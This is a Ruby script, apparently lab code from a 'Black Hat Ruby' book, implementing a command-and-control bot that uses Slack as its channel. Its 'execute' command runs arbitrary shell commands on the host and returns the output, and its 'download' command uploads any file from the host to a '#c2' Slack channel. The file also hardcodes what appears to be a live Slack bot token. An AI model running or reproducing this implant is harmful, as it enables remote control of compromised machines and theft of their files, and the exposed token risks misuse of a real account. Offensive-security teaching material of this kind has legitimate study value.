#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Slack-based C2 bot.
# Requirements:
#   gem install slack-ruby-bot 
#   gem install async-websocket -v 0.8.0
#
require 'slack-ruby-bot'
require 'pathname'

class BlackHatRubyBot < SlackRubyBot::Bot
  ENV['SLACK_API_TOKEN'] = 'xoxb-PUT-TOKEN-HERE'
  SlackRubyBot::Client.logger.level = Logger::FATAL # Logger::ERROR

  def self.clean_message(message)
    message.split[1..-1].join(' ').scan(/^([^\s]+)\s?(.+)?/).flatten
  end

  command 'execute' do |client, data, match|
    bot_cmd, args = clean_message(data.text)
    result = `#{args} 2>&1`
    text = "*$ #{args}*\n" + "```\n#{result}```"
    client.say(text: text, channel: data.channel)
  rescue Exception => e 
    puts "[!] Error in execute"
    # puts e.full_message
  end

  command 'download' do |client, data, match|
    bot_cmd, args = clean_message(data.text)
    file = Pathname.new(args)

    client.web_client.files_upload(
      channels: '#c2',
      as_user: true,
      file: Faraday::UploadIO.new(file.realpath.to_s, '*/*'),
      title: 'My Avatar',
      filename: file.basename.to_s,
      initial_comment: "*Filename:* #{file.basename.to_s}"
    )
    client.web_client.chat_postMessage(
      channel: data.channel,
      as_user: true,
      text: "The file has been download successfully!"
    )
  rescue Exception => e 
    puts "[!] Error in download"
    # puts e.full_message
  end

end

begin
  # Example of using slack-ruby-client directely
  #   https://github.com/slack-ruby/slack-ruby-client
  Slack.configure do |config|
    ENV['SLACK_API_TOKEN'] = 'xoxb-185819531842-514550661843-BN6v9di8Blw6nRB3I153J01n'
    config.token = ENV['SLACK_API_TOKEN']
    raise 'Missing ENV[SLACK_API_TOKEN]!' unless config.token
  end
  c = Slack::Web::Client.new
  message = <<~MSG
    *Welcome to BlackHatRuby C2*
    \n
    Available commands: 
    ```
    execute  <YOURCOMMAND>
    download <FILEPATH>
    ``` 
    Example: 
    ```
    @blackhatruby execute ifconfig
    ```
  MSG
  c.chat_postMessage(channel: '#c2', text: message, as_user: true)

  BlackHatRubyBot.run
rescue Exception => e 
  puts "[!] Main error"
  # puts e.full_message
end
